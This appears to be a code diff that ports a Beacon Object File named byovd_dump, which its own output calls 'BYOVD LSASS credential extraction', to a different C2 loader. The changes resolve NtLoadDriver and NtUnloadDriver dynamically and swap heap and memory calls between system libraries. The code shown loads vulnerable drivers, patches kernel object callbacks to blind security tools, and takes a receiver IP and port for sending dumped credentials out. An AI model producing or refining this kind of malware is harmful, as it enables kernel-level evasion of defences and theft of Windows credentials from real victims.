@@ -9,11 +9,17 @@ typedef struct {
     int   size;
 } datap;
 
-void  BeaconPrintf(int type, const char *fmt, ...);
-void  BeaconDataParse(datap *parser, char *buffer, int size);
-char *BeaconDataExtract(datap *parser, int *size);
-char *BeaconDataPtr(datap *parser, int size);
-int   BeaconDataInt(datap *parser);
+DECLSPEC_IMPORT void  BeaconPrintf(int type, const char *fmt, ...);
+DECLSPEC_IMPORT void  BeaconOutput(int type, char *data, int len);
+DECLSPEC_IMPORT void  BeaconDataParse(datap *parser, char *buffer, int size);
+DECLSPEC_IMPORT char *BeaconDataExtract(datap *parser, int *size);
+DECLSPEC_IMPORT char *BeaconDataPtr(datap *parser, int size);
+DECLSPEC_IMPORT int   BeaconDataInt(datap *parser);
+
+DECLSPEC_IMPORT size_t MSVCRT$strlen(const char *);
+DECLSPEC_IMPORT int    MSVCRT$memcmp(const void *, const void *, size_t);
+#define strlen MSVCRT$strlen
+#define memcmp MSVCRT$memcmp
 
 #define CALLBACK_OUTPUT 0x00
 #define CALLBACK_ERROR  0x0d
@@ -30,13 +36,18 @@ typedef struct {
 } USTR_W;
 
 
-DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtLoadDriver(USTR_W *RegistryPath);
-DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtUnloadDriver(USTR_W *RegistryPath);
-DECLSPEC_IMPORT PVOID    NTAPI NTDLL$RtlAllocateHeap(PVOID Heap, ULONG Flags, SIZE_T Size);
-DECLSPEC_IMPORT BOOL     NTAPI NTDLL$RtlFreeHeap(PVOID Heap, ULONG Flags, PVOID Base);
-DECLSPEC_IMPORT PVOID    NTAPI NTDLL$RtlProcessHeap(void);
-DECLSPEC_IMPORT void     NTAPI NTDLL$RtlMoveMemory(PVOID dst, const PVOID src, SIZE_T n);
-DECLSPEC_IMPORT void     NTAPI NTDLL$RtlZeroMemory(PVOID dst, SIZE_T n);
+/* NTDLL functions resolved dynamically — Kassandra's BOF loader can't resolve ntdll */
+typedef NTSTATUS (NTAPI *fnNtLoadDriver)(USTR_W *RegistryPath);
+typedef NTSTATUS (NTAPI *fnNtUnloadDriver)(USTR_W *RegistryPath);
+static fnNtLoadDriver   pNtLoadDriver;
+static fnNtUnloadDriver pNtUnloadDriver;
+
+DECLSPEC_IMPORT PVOID  WINAPI KERNEL32$GetProcessHeap(void);
+DECLSPEC_IMPORT PVOID  WINAPI KERNEL32$HeapAlloc(PVOID Heap, DWORD Flags, SIZE_T Size);
+DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$HeapFree(PVOID Heap, DWORD Flags, PVOID Base);
+
+DECLSPEC_IMPORT void  *MSVCRT$memcpy(void *, const void *, size_t);
+DECLSPEC_IMPORT void  *MSVCRT$memset(void *, int, size_t);
 
 DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateFileW(LPCWSTR,DWORD,DWORD,LPSECURITY_ATTRIBUTES,DWORD,DWORD,HANDLE);
 DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateFileA(LPCSTR,DWORD,DWORD,LPSECURITY_ATTRIBUTES,DWORD,DWORD,HANDLE);
@@ -51,7 +62,7 @@ DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$OpenProcess(DWORD,BOOL,DWORD);
 DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$CloseHandle(HANDLE);
 DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$ReadProcessMemory(HANDLE,LPCVOID,LPVOID,SIZE_T,SIZE_T*);
 DECLSPEC_IMPORT SIZE_T WINAPI KERNEL32$VirtualQueryEx(HANDLE,LPCVOID,PMEMORY_BASIC_INFORMATION,SIZE_T);
-DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$EnumDeviceDrivers(LPVOID*,DWORD,LPDWORD);
+DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$K32EnumDeviceDrivers(LPVOID*,DWORD,LPDWORD);
 DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$LoadLibraryExA(LPCSTR,HANDLE,DWORD);
 DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$FreeLibrary(HMODULE);
 DECLSPEC_IMPORT FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE,LPCSTR);
@@ -153,16 +164,16 @@ static void bof_str_to_wcs(const char *src, wchar_t *dst, int max) {
     KERNEL32$MultiByteToWideChar(CP_UTF8, 0, src, -1, dst, max);
 }
 static void *bof_alloc(SIZE_T n) {
-    return NTDLL$RtlAllocateHeap(NTDLL$RtlProcessHeap(), 0, n);
+    return KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), 0, n);
 }
 static void bof_free(void *p) {
-    if (p) NTDLL$RtlFreeHeap(NTDLL$RtlProcessHeap(), 0, p);
+    if (p) KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, p);
 }
 static void bof_memcpy(void *dst, const void *src, SIZE_T n) {
-    NTDLL$RtlMoveMemory(dst, (PVOID)src, n);
+    MSVCRT$memcpy(dst, src, n);
 }
 static void bof_memset0(void *dst, SIZE_T n) {
-    NTDLL$RtlZeroMemory(dst, n);
+    MSVCRT$memset(dst, 0, n);
 }
 
 static void EnablePriv(const char *name) {
@@ -263,7 +274,7 @@ static BOOL LoadDriver(void) {
     us.Buffer        = g_regPath;
     us.Length        = (USHORT)(bof_wcs_len(g_regPath) * 2);
     us.MaximumLength = us.Length + 2;
-    NTSTATUS st = NTDLL$NtLoadDriver(&us);
+    NTSTATUS st = pNtLoadDriver(&us);
     if (!NT_SUCCESS(st) && st != (LONG)0xC000010E) {
         BeaconPrintf(CALLBACK_ERROR, "[-] NtLoadDriver: 0x%08lX\n", (ULONG)st);
         return FALSE;
@@ -676,7 +687,7 @@ static BOOL PatchObCallbacks(QWORD ntosBase) {
 static QWORD GetNtosBase(void) {
     LPVOID drvs[1024];
     DWORD cb = 0;
-    if (!KERNEL32$EnumDeviceDrivers(drvs, sizeof(drvs), &cb)) return 0;
+    if (!KERNEL32$K32EnumDeviceDrivers(drvs, sizeof(drvs), &cb)) return 0;
     return (QWORD)drvs[0];
 }
 
@@ -845,7 +856,7 @@ static void Cleanup(void) {
         us.Buffer        = g_regPath;
         us.Length        = (USHORT)(bof_wcs_len(g_regPath) * 2);
         us.MaximumLength = us.Length + 2;
-        NTSTATUS st = NTDLL$NtUnloadDriver(&us);
+        NTSTATUS st = pNtUnloadDriver(&us);
         BeaconPrintf(CALLBACK_OUTPUT, "[*] NtUnloadDriver: 0x%08lX\n", (ULONG)st);
 
         wchar_t keyPath[256];
@@ -870,7 +881,23 @@ static void Cleanup(void) {
  *   int:<receiver_port>         - TCP listener port
  *   int:<driver_type>           - 0=biostool, 1=rtsppx, 2=rwdrv
  * ============================================================================ */
-void Go(char *args, int len) {
+void go(char *args, int len) {
+    BeaconPrintf(CALLBACK_OUTPUT,
+                 "[*] byovd_dump BOF starting (BYOVD LSASS credential extraction)\n");
+
+    HMODULE hNtdll = KERNEL32$LoadLibraryExA("ntdll.dll", NULL, 0);
+    if (!hNtdll) {
+        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to load ntdll.dll\n");
+        return;
+    }
+    pNtLoadDriver   = (fnNtLoadDriver)KERNEL32$GetProcAddress(hNtdll, "NtLoadDriver");
+    pNtUnloadDriver = (fnNtUnloadDriver)KERNEL32$GetProcAddress(hNtdll, "NtUnloadDriver");
+    if (!pNtLoadDriver || !pNtUnloadDriver) {
+        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to resolve NtLoadDriver/NtUnloadDriver\n");
+        return;
+    }
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] ntdll resolved dynamically\n");
+
     bof_memset0(g_svcName, sizeof(g_svcName));
     bof_memset0(g_regPath, sizeof(g_regPath));
     bof_memset0(g_drvPath, sizeof(g_drvPath));
@@ -878,15 +905,12 @@ void Go(char *args, int len) {
     g_cr3     = 0;
     g_drvType = DRV_BIOSTOOL;
 
-    BeaconPrintf(CALLBACK_OUTPUT,
-                 "[*] byovd_dump BOF starting (BYOVD LSASS credential extraction)\n");
-
     datap parser;
     BeaconDataParse(&parser, args, len);
 
     int   drvLen   = 0;
     char *drvData  = BeaconDataExtract(&parser, &drvLen);
-    char *recvIp   = BeaconDataPtr(&parser, 64);
+    char *recvIp   = BeaconDataExtract(&parser, NULL);
     int   recvPort = BeaconDataInt(&parser);
     int   drvType  = BeaconDataInt(&parser);
 
